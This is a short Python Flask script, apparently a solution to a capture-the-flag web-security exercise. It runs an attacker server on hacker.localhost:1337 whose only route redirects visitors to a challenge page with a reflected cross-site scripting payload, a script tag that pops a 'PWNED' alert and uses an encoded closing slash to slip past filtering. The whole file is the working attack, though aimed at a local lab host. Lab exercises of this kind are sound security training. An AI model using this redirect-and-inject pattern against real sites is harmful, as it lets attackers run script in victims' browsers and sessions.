import flask
import os
app = flask.Flask(__name__)

@app.route("/")
def hello():
	return flask.redirect("http://challenge.localhost/ephemeral?msg=<script>alert(\"PWNED\")<%2fscript>", code=302)

app.secret_key = os.urandom(8)
port = 1337
app.config['SERVER_NAME'] = f"hacker.localhost:{port}"
app.run("hacker.localhost", port)
